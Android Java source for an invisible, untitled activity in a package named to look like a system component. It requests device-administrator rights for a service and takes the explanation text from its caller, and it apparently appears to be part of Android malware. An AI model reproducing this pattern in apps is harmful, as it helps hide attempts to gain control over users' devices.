package com.android.engine.ui;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;

public class DeviceAdminActivity extends Activity {

  protected void onCreate(Bundle bundle) {
    try {
      super.onCreate(bundle);
      setTitle("");
      getWindow().setBackgroundDrawable(new ColorDrawable(0));
      getWindow().clearFlags(2);

      Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
      intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, MyService.componentName);
      intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
          getIntent().getStringExtra("Explanation"));
      startActivityForResult(intent, 1);
      finish();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
